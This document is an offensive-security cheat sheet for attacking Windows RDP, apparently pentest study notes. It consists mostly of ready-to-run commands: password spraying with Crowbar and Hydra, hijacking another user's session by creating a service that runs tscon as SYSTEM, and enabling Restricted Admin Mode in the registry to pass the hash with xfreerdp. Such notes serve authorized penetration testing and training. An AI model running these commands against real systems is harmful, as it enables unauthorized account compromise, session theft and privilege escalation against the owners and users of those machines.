# Attacking RDP

RDP on TCP/3389. Spray before brute — lockout risk.

Password spray with Crowbar:

```bash
crowbar -b rdp -s <TARGET>/32 -U <USERLIST> -c '<PASS>'
```

Or Hydra — limit threads, RDP doesn't like parallel connections:

```bash
hydra -L <USERLIST> -p '<PASS>' <TARGET> rdp -t 4 -W 3
```

Connect with valid creds:

```bash
xfreerdp /v:<TARGET> /u:<USER> /p:<PASS>
rdesktop -u <USER> -p <PASS> <TARGET>
```

---

## RDP Session Hijacking

Requires local admin on a host where other users have active RDP sessions. Hijack their session without knowing their password → if they're DA, you are too.

Check active sessions:

```cmd
query user
```

Create a service that runs `tscon` as SYSTEM to steal the target session:

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<YOUR_SESSION_NAME>"
net start sessionhijack
```

> [!warning] Does not work on Server 2019. Works on Server 2016 and earlier.

---

## RDP Pass-the-Hash

Requires Restricted Admin Mode enabled on the target (disabled by default).

Enable it on the target (needs admin access first):

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Then PTH via xfreerdp:

```bash
xfreerdp /v:<TARGET> /u:<USER> /pth:<NTHASH>
```

> [!warning] `/pth` only works if `DisableRestrictedAdmin` is set to `0` on the target. If you get an "account restrictions" error, the reg key isn't set. You need some form of prior access to enable it first.